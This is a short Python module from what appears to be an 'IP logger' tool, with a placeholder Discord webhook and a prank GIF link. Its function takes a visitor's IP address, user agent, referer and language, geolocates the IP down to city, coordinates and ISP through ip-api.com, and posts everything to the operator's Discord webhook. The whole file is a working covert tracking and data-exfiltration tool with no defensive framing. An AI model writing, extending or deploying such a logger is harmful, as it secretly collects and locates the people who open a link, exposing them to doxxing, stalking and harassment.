import requests
from datetime import datetime

# /web/DISCORD WEBHOOK/rayzer.py

# CONFIGURATION
WEBHOOK_URL = "PUT YOUR WEBHOOK HERE"
GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif"

def send_to_discord(ip, user_agent, referer, lang):
    try:
        geo_r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,query")
        geo = geo_r.json()
    except:
        geo = {}

    embed = {
        "username": "Rayzer IP Logger",
        "embeds": [{
            "title": "New Log (Python) 🔍",
            "color": 0x2f3136,
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "Location", "value": f"{geo.get('city', '?')}, {geo.get('regionName', '?')}, {geo.get('country', '?')}", "inline": True},
                {"name": "Cords", "value": f"{geo.get('lat', '?')}, {geo.get('lon', '?')}", "inline": True},
                {"name": "ISP", "value": geo.get("isp", "Unknown"), "inline": False},
                {"name": "User-Agent", "value": f"```{user_agent}```", "inline": False},
                {"name": "Referer", "value": referer, "inline": False},
                {"name": "Language", "value": lang, "inline": True}
            ],
            "footer": {"text": "Rayzer Logger"},
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }

    requests.post(WEBHOOK_URL, json=embed)

if __name__ == "__main__":
    print("Discord Webhook Logger Module Ready.")
